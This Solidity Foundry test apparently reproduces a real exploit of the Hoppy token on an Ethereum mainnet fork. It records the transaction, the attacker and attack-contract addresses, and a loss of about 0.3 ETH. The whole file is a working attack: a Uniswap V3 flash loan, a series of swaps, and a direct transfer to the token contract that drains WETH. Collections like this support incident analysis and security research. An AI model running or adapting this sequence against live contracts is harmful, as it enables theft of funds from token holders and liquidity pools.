pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~0.3 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0x6fb7f8e9eb09d6ae17dbe82b2b42f46f64fb9c3197438b68ecf03e832d5fc791
// Attacker : https://etherscan.io/address/0x676c3262e8f0fba0031a93ea74ff801b99ac177b
// Attack Contract : https://etherscan.io/address/0xc976ed4b25e1e7019ff34fb54f4e63b1550b70c3
// GUY : https://x.com/ChainAegis/status/1775351437410918420


contract Exploit is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 Pair = Uni_Pair_V3(0xaA6f337f16E6658d9c9599c967D3126051b6c726);
    IERC20 Hoppy = IERC20(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() external {
        cheats.createSelectFork("mainnet", 19570744);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        uint256 amount=Hoppy.balanceOf(address(Pair));
        Pair.flash(address(this),0,amount,"123");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
   

    }
    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
            Hoppy.approve(address(Router),type(uint256).max);
            swap_token_to_token(address(Hoppy), address(WETH), 3071435167652113869853);
            Hoppy.transfer(address(Hoppy),206900000001000000000);
            swap_token_to_token(address(Hoppy), address(WETH), 4206900000000000000000);
            swap_token_to_ExactToken(7560087519329645008552,address(WETH), address(Hoppy), 3907363705363283233);
            Hoppy.transfer(address(msg.sender),7560087519329645008552);
    
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    function swap_token_to_ExactToken(uint256 amountout,address a,address b,uint256 amountInMax) payable public {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapTokensForExactTokens(amountout,amountInMax, path, address(this), block.timestamp + 120);

    }
}
